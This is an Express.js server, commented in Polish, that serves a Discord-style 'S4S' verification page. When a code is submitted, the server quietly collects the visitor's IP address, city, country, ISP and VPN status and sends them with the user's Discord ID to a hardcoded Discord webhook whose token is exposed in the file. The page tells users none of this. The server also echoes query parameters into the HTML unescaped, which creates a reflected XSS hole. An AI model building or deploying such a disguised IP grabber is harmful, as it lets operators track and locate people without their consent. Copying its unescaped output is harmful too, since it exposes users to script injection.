const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const validCodes = new Map();

// Funkcja do info o IP
async function getIPInfo(ip) {
  try {
    let cleanIp = ip;
    if (ip === '::1' || ip === '127.0.0.1' || ip === '::ffff:127.0.0.1') {
      cleanIp = '8.8.8.8';
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=66846719`);
    const data = response.data;
    
    if (data.status === 'success') {
      return {
        ip: data.query,
        isp: data.isp || 'Nieznany ISP',
        vpn: (data.proxy || data.hosting) ? 'Tak' : 'Nie',
        country: data.country || 'Nieznany',
        region: data.regionName || 'Nieznany',
        city: data.city || 'Nieznane',
        type: data.mobile ? 'Mobile' : (data.hosting ? 'Hosting' : 'Stacjonarny')
      };
    }
  } catch (error) {
    console.error('Błąd IP API:', error.message);
  }
  
  return {
    ip: ip,
    isp: 'Nieznany ISP',
    vpn: 'Nieznane',
    country: 'Nieznany',
    region: 'Nieznany',
    city: 'Nieznane',
    type: 'Nieznany'
  };
}

// Rejestracja kodu
app.post('/api/register-code', (req, res) => {
  const { code, userId } = req.body;
  if (!code || !userId) return res.status(400).json({ error: 'Brak danych' });
  
  validCodes.set(code, { userId, expires: Date.now() + 15 * 60 * 1000 });
  console.log(`✅ Kod ${code} dla ${userId}`);
  res.json({ success: true });
});

// Strona główna
app.get('/', (req, res) => {
  const { code, userId } = req.query;
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Weryfikacja - S4S</title>
      <style>
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; border-radius: 20px; padding: 40px; max-width: 400px; width: 90%; }
        h1 { text-align: center; color: #333; }
        .code-display { background: #f0f0f0; border-radius: 10px; padding: 20px; text-align: center; font-size: 32px; font-weight: bold; margin-bottom: 20px; color: #667eea; }
        input { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; margin-bottom: 20px; }
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        .message { margin-top: 20px; padding: 10px; border-radius: 8px; display: none; }
        .message.success { background: #d4edda; color: #155724; display: block; }
        .message.error { background: #f8d7da; color: #721c24; display: block; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🔐 Weryfikacja - S4S</h1>
        <div class="code-display">${code || 'Wpisz kod'}</div>
        <input type="text" id="code" placeholder="Kod" value="${code || ''}">
        <input type="hidden" id="userId" value="${userId || ''}">
        <button onclick="verify()">Zweryfikuj</button>
        <div id="message" class="message"></div>
      </div>
      <script>
        async function verify() {
          const code = document.getElementById('code').value;
          const userId = document.getElementById('userId').value;
          const msg = document.getElementById('message');
          if(!code) { msg.className = 'message error'; msg.textContent = 'Wpisz kod!'; return; }
          if(!userId) { msg.className = 'message error'; msg.textContent = 'Brak ID!'; return; }
          msg.className = 'message'; msg.textContent = '⏳ Weryfikacja...'; msg.style.display = 'block';
          try {
            const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code, userId }) });
            const data = await res.json();
            if(data.success) { msg.className = 'message success'; msg.textContent = '✅ Zweryfikowano!'; }
            else { msg.className = 'message error'; msg.textContent = '❌ ' + data.message; }
          } catch(e) { msg.className = 'message error'; msg.textContent = '❌ Błąd'; }
        }
        window.onload = () => {
          const url = new URLSearchParams(window.location.search);
          if(url.get('code')) document.getElementById('code').value = url.get('code');
          if(url.get('userId')) document.getElementById('userId').value = url.get('userId');
          if(url.get('code') && url.get('userId')) setTimeout(verify, 500);
        }
      </script>
    </body>
    </html>
  `);
});

// WEBHOOK - WPISZ SWÓJ NOWY URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487165150451601558/7jyNH1oDB_D15dWuwf7AZALVlspxuGgugG_GhXjGMTbGsjzwtR-4yc2QO1J7fCXVwzrW';

// Weryfikacja
app.post('/api/verify', async (req, res) => {
  const { code, userId } = req.body;
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0];
  
  console.log(`🔍 Weryfikacja: ${userId}, IP: ${clientIp}`);
  
  const stored = validCodes.get(code);
  if (!stored || stored.userId !== userId || stored.expires < Date.now()) {
    return res.json({ success: false, message: 'Nieprawidłowy kod!' });
  }
  
  validCodes.delete(code);
  const ipInfo = await getIPInfo(clientIp);
  console.log(`🌐 IP INFO: ${ipInfo.country}, ${ipInfo.isp}, ${ipInfo.ip}`);
  
  // WYSYŁKA WEBHOOKA
  console.log(`📤 WYSYŁAM WEBHOOK...`);
  
  try {
    const embedData = {
      embeds: [{
        title: '✅ Nowa weryfikacja',
        color: 0x00ff00,
        fields: [
          { name: 'Użytkownik', value: `<@${userId}>`, inline: false },
          { name: 'IP', value: ipInfo.ip, inline: true },
          { name: 'ISP', value: ipInfo.isp, inline: true },
          { name: 'Kraj', value: ipInfo.country, inline: true },
          { name: 'Miasto', value: ipInfo.city, inline: true },
          { name: 'VPN/Proxy', value: ipInfo.vpn, inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    
    const response = await axios.post(WEBHOOK_URL, embedData);
    console.log(`✅ WEBHOOK WYSŁANY! Status: ${response.status}`);
  } catch (error) {
    console.error(`❌ WEBHOOK BŁĄD: ${error.message}`);
    if (error.response) {
      console.error(`Status: ${error.response.status}`);
      console.error(`Dane:`, error.response.data);
    }
  }
  
  res.json({ success: true, message: 'Zweryfikowano!' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Serwer na porcie ${PORT}`);
  console.log(`📡 Webhook URL: ${WEBHOOK_URL}`);
});
